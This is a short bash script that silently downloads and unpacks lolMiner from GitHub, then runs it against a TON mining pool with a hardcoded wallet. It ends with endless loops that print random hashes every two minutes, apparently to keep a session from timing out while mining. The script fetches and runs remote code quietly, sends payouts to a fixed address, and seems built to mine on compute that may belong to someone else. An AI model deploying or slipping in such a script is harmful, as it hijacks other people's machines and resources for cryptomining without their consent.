#!/bin/bash

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz >/dev/null 2>&1

tar xaf lolMiner_v1.46a_Lin64.tar.gz >/dev/null 2>&1

chmod +x 1.46a >/dev/null 2>&1

./lolMiner --algo TON --pool https://next.ton-pool.com:443 --user EQDKNhmKMdn1RYKBUHm0mTiBdQ80JrAyTA5cqzjr2n2rrG5X --pass worker

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
